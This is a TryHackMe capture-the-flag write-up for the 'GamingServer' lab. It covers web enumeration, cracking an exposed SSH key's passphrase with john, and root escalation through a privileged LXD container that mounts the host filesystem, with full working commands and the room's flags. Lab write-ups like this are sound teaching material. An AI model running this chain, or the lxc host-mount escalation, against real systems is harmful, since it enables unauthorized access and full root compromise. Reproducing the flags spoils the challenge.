# GamingServer — TryHackMe Writeup

**Author:** Artem  
**Platform:** TryHackMe  
**Room:** GamingServer  
**Difficulty:** Easy  
**Date:** 2026-05-22  
**Tags:** SSH Key Cracking, Source Code Disclosure, LXD Privilege Escalation, Container Escape

---

## Overview

A beginner-friendly Boot2Root box themed around a gaming community website ("House of Danak"). The attack chain involves finding an encrypted SSH private key exposed in a web directory, discovering the username in an HTML comment, cracking the key passphrase with a wordlist conveniently left on the server, and escalating privileges via LXD group membership to achieve full root access.

- **User Flag:** `a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e`
- **Root Flag:** `2e337b8c9f3aff0c2b3e8d4e6a7c88fc`

---

## MITRE ATT&CK Mapping

| TTP | Technique | Description |
|-----|-----------|-------------|
| T1595.001 | Active Scanning: Port Scanning | Nmap service and OS detection scan |
| T1590 | Gather Victim Network Information | Username leaked in HTML comment |
| T1552.004 | Unsecured Credentials: Private Keys | SSH private key exposed in `/secret/` directory |
| T1110.002 | Brute Force: Password Cracking | Cracking SSH key passphrase with john + dict.lst |
| T1078 | Valid Accounts | SSH login as john with cracked private key |
| T1611 | Escape to Host | LXD privileged container with host filesystem mounted |

---

## Enumeration

### Nmap

```bash
nmap -sC -sV -O 10.65.135.226
```

| Port | Service | Details |
|------|---------|---------|
| 22 | SSH | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80 | HTTP | Apache httpd 2.4.29 — "House of danak" |

Only two ports open — a classic lightweight Linux box.

### Web / Directory Enumeration

```bash
gobuster dir -u http://10.65.135.226 -w /usr/share/wordlists/dirb/common.txt -x .html,.php
```

Key findings:

| Path | Status | Notes |
|------|--------|-------|
| `/uploads/` | 301 | Directory listing enabled — contains `dict.lst`, `manifesto.txt`, `meme.jpg` |
| `/secret/` | 301 | Directory listing enabled — contains `secretKey` |
| `/robots.txt` | 200 | Lists `/uploads/` |
| `/about.html` | 200 | Standard page, no hidden content |
| `/myths.html` | 200 | Standard page |

Two directories with listing enabled immediately stood out: `/secret/` and `/uploads/`.

---

## Initial Access

### Source Code Analysis — Username Discovery

Inspecting the HTML source of `index.html` revealed a comment with a username:

```bash
curl -s http://10.65.135.226/index.html | grep '<!--'
```

```html
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```

Username: **john**

### SSH Key Recovery

The `/secret/` directory contained a file called `secretKey` — an RSA private key encrypted with AES-128-CBC:

```bash
curl http://10.65.135.226/secret/secretKey -o secretKey
```

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547
...
-----END RSA PRIVATE KEY-----
```

The `Proc-Type: 4,ENCRYPTED` header confirms the key is passphrase-protected.

### Passphrase Cracking

The `/uploads/` directory contained `dict.lst` — a small 2KB wordlist, clearly intended for cracking the key:

```bash
curl http://10.65.135.226/uploads/dict.lst -o dict.lst
```

Converted the key to a john-compatible hash and cracked it:

```bash
ssh2john secretKey > secretKey.hash
john secretKey.hash --wordlist=dict.lst
```

```
letmein          (secretKey)
```

Passphrase: **letmein**

### SSH Access

```bash
chmod 600 secretKey
ssh -i secretKey john@10.65.135.226
```

Entered the passphrase `letmein` when prompted. User shell obtained.

```bash
cat ~/user.txt
# a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```

---

## Privilege Escalation

### Enumeration

Standard privesc checks:

```bash
id
# uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)

sudo -l
# Password required — passphrase "letmein" doesn't work as sudo password

find / -perm -4000 2>/dev/null
# Standard SUID binaries only — nothing exploitable

cat /etc/crontab
# Default cron entries — no custom jobs
```

`sudo -l` was a dead end (no password available). SUID binaries were all default. Crontab had nothing custom. But the `id` output revealed the critical detail: **john is a member of the `lxd` group**.

### LXD Group Exploitation

Any member of the `lxd` group can create and manage containers without sudo. A privileged container can mount the host filesystem and provide root-level access to it.

**On the attacker machine** — built a minimal Alpine Linux image:

```bash
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo ./build-alpine
python3 -m http.server 8000
```

**On the target** — imported the image and created a privileged container:

```bash
cd /tmp
wget http://10.65.108.217:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

The flag `security.privileged=true` disables UID namespace mapping — root inside the container is real root on the host. Mounting `source=/` at `/mnt/root` exposes the entire host filesystem.

```bash
cat /mnt/root/root/root.txt
# 2e337b8c9f3aff0c2b3e8d4e6a7c88fc
```

---

## Lessons Learned

1. **LXD group = root.** First encounter with LXD privilege escalation. The same principle applies to the `docker` group — if a user is in either group, they can trivially escalate to root by mounting the host filesystem into a privileged container. Always check `id` output for dangerous group memberships: `lxd`, `docker`, `disk`, `adm`.

2. **HTML comments leak information.** The username was sitting in a comment on the index page. Always view page source — `curl | grep '<!--'` or browser developer tools.

3. **Exposed private keys + wordlists = easy initial access.** The server handed us everything: the key in `/secret/`, the wordlist in `/uploads/`, and the username in a comment. In real engagements, directory listing enabled on sensitive paths is a critical finding.

4. **Container escape vs VM escape.** Containers share the host kernel, so the isolation boundary is thinner than a VM. A privileged container with host filesystem mounted effectively **is** the host. This is T1611 (Escape to Host) in MITRE ATT&CK.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning, service/OS detection |
| gobuster | Web directory enumeration |
| curl | Manual HTTP requests, file downloads |
| ssh2john | Convert SSH key to john-crackable hash |
| john | Passphrase cracking |
| lxd-alpine-builder | Build minimal container image |
| lxc | LXD container management for privesc |

---

## Attack Path Summary

```
Web Enumeration
    ├── /secret/secretKey → encrypted SSH private key
    ├── /uploads/dict.lst → cracking wordlist
    └── index.html comment → username "john"
            │
            ▼
SSH Key Cracking (ssh2john + john)
    passphrase: letmein
            │
            ▼
SSH as john → user.txt
            │
            ▼
id → lxd group membership
            │
            ▼
LXD Privesc (privileged container + host mount)
            │
            ▼
root.txt
```
